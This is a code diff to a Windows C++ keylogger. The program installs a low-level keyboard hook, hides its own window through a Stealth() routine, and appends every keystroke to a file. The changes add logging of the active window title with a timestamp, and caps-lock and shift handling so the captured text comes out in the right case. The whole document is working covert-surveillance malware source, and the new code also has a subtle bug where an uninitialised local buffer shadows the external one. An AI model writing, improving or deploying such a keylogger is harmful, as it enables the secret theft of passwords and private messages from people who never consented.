@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include <time.h>
 #include <iostream>
 
 // defines whether the window is visible or not
@@ -14,6 +15,8 @@ HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke, char *file);
+
+extern char lastwindow[256];
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
@@ -44,7 +47,7 @@ void SetHook()
 	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
+		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
 	}
 }
 
@@ -55,11 +58,35 @@ void ReleaseHook()
 
 int Save(int key_stroke, char *file)
 {
+    char lastwindow[256];
+    
 	if ((key_stroke == 1) || (key_stroke == 2))
-		return 0;
-
+		return 0; // ignore mouse clicks
+	
+	
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
+		
+	
+	HWND foreground = GetForegroundWindow();
+    if (foreground)
+    {
+        char window_title[256];
+        GetWindowText(foreground, window_title, 256);
+        
+        if(strcmp(window_title, lastwindow)!=0) {
+            strcpy(lastwindow, window_title);
+            
+            // get time
+            time_t t = time(NULL);
+            struct tm *tm = localtime(&t);
+            char s[64];
+            strftime(s, sizeof(s), "%c", tm);
+            
+            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
+        }
+    }
+
 
 	std::cout << key_stroke << '\n';
 
@@ -91,9 +118,22 @@ int Save(int key_stroke, char *file)
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
 		fprintf(OUTPUT_FILE, "%s", ".");
-	else
+	else if (key_stroke == 20)
+	     fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+	else {
+         if(key_stroke>=65 && key_stroke<=90) { // A-Z
+             // check caps lock
+             bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001)!=0);
+             
+             // check shift key
+             if((GetKeyState(VK_SHIFT) & 0x0001)!=0 || (GetKeyState(VK_LSHIFT) & 0x0001)!=0 || (GetKeyState(VK_RSHIFT) & 0x0001)!=0) {
+                  lowercase = !lowercase;                     
+             }
+             
+             if (lowercase) key_stroke += 32;
+         }
 		fprintf(OUTPUT_FILE, "%c", key_stroke);
-
+    }
 	// NOTE: Numpad-Keys seem to print as lowercase letters
 
 	fclose(OUTPUT_FILE);
@@ -111,7 +151,7 @@ void Stealth()
 	#endif // invisible
 }
 
-void main()
+int main()
 {
 	// visibility of window
 	Stealth();
